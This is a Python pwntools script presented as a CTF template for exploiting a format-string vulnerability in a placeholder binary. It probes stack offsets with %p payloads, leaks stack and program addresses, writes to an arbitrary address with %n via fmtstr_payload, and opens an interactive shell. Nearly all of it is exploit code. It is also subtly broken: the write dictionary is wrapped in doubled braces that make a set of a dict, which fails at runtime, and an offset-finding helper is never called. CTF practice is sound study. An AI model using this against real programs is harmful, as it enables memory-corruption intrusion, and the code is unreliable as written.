#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Format String Template - Format String Vulnerability
Author: CTF Player
Date: 2025-01-XX
Target: target_binary
"""

from pwn import *

# 设置目标程序
binary = "./target"
elf = ELF(binary)

# 设置上下文
context.binary = elf
context.log_level = 'debug'
context.arch = 'amd64'

def exploit():
    # 连接方式选择
    if args.REMOTE:
        p = remote("127.0.0.1", 9999)
    else:
        p = process(binary)
    
    # 调试设置
    if args.GDB:
        gdb.attach(p, '''
        break main
        continue
        ''')
    
    # 格式化字符串漏洞利用
    # 1. 找到格式化字符串的偏移
    def find_offset():
        for i in range(1, 20):
            payload = f"%{i}$p".encode()
            p.sendline(payload)
            response = p.recvline()
            if b"0x" in response:
                log.info(f"Found format string at offset {i}: {response}")
        return 6

    offset = 6  # 格式化字符串偏移
    
    # 2. 泄露地址
    # 泄露栈地址
    payload = f"%{offset}$p".encode()
    p.sendline(payload)
    stack_leak = int(p.recvline().strip(), 16)
    log.info(f"Stack leak: {hex(stack_leak)}")
    
    # 泄露程序基址
    payload = f"%{offset+1}$p".encode()
    p.sendline(payload)
    prog_leak = int(p.recvline().strip(), 16)
    log.info(f"Program leak: {hex(prog_leak)}")
    
    # 3. 任意地址写入
    target_addr = 0x601020  # 要修改的地址
    target_value = 0x401234   # 要写入的值
    
    # 使用%n进行写入
    writes = {{target_addr: target_value}}
    payload = fmtstr_payload(offset, writes)
    
    p.sendline(payload)
    
    # 获取shell
    p.interactive()

if __name__ == "__main__":
    exploit()
